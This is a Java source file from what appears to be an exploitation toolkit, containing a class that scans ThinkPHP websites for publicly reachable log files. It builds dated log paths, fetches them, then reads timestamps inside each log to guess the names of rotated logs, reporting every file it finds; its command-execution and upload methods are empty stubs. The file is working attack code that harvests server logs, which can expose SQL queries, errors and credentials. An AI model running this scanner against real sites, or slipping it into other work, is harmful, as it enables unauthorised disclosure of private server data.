package fun.fireline.exp.php.thinkphp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;

import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @author yhy
 * @date 2021/8/20 22:23
 * @github https://github.com/yhy0
 */

public class TP_log implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();
    private String results = null;


    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
        return null;
    }

    public String checkVul(String url, String path, String year, String month, String day) {
        this.target = url;
        StringBuilder results = new StringBuilder();
        if (month.length() == 1) {
            month = "0" + month;
        }

        if (day.length() == 1) {
            day = "0" + day;
        }

        if (!path.startsWith("/")) {
            path = "/" + path;
        }

        if (!path.endsWith("/")) {
            path = path + "/";
        }

        String url1 = url + path + year.substring(2) + "_" + month + "_" + day + ".log";
        String url2 = url + path + year + month + "/" + day + ".log";
        String url3 = url + path + year + month + "/" + day + "_error.log";
        String url4 = url + path + year + month + "/" + day + "_sql.log";
        ArrayList<String> urls = new ArrayList();
        urls.add(url1);
        urls.add(url2);
        urls.add(url3);
        urls.add(url4);
        Iterator var12 = urls.iterator();

        String payload;
        Response response;
        do {
            if (!var12.hasNext()) {
                return results.toString();
            }

            payload = (String)var12.next();
            response = HttpTools.get(payload, this.headers, "UTF-8");
            if (response.getCode() == 200 && response.getText().length() > 500) {
                results.append("[+] 日志文件存在：").append(payload).append("\n");
                String fileName = payload.replaceAll(".*/", "");
                String nowFileName = "";
                String pattern = "\\[ (\\d{4}-\\d{2}-\\d{2})T((\\d{2}:){2}\\d{2})\\+08:00 \\]";
                Pattern r = Pattern.compile(pattern);
                boolean flag = true;

                while(flag) {
                    Matcher time = r.matcher(response.getText());
                    if (!time.find()) {
                        break;
                    }

                    try {
                        String time_str = time.group(1) + ' ' + time.group(2);
                        DateFormat t = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                        Date date = t.parse(time_str);
                        ArrayList<Integer> timeStamps = new ArrayList();
                        timeStamps.add((int)(date.getTime() / 1000L));
                        timeStamps.add((int)(date.getTime() / 1000L) - 1);
                        timeStamps.add((int)(date.getTime() / 1000L) - 2);
                        timeStamps.add((int)(date.getTime() / 1000L) - 3);
                        Iterator var25 = timeStamps.iterator();

                        while(var25.hasNext()) {
                            int timeStamp = (Integer)var25.next();
                            String tmpFileName = String.valueOf(timeStamp) + '-' + fileName;
                            if (tmpFileName.equals(nowFileName)) {
                                flag = false;
                                break;
                            }

                            String timeStampLog = payload.replace(fileName, tmpFileName);
                            response = HttpTools.get(timeStampLog, this.headers, "UTF-8");
                            if (response.getCode() == 200 && response.getText().length() > 500) {
                                results.append("[+] 日志文件存在：").append(timeStampLog).append("\n");
                                nowFileName = tmpFileName;
                                break;
                            }
                        }
                    } catch (ParseException var29) {
                        var29.printStackTrace();
                    }
                }
            }
        } while(response.getError() == null);

        results.append("[-] 访问 ").append(payload).append(" 失败， ").append(response.getError()).append("\n");
        return results.toString();
    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
       return null;
    }

    // 获取当前的web路径，todo
    @Override
    public String getWebPath() {
        return null;
    }

    @Override
    public String uploadFile(String content, String fileName, String platform) throws Exception {
        return null;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
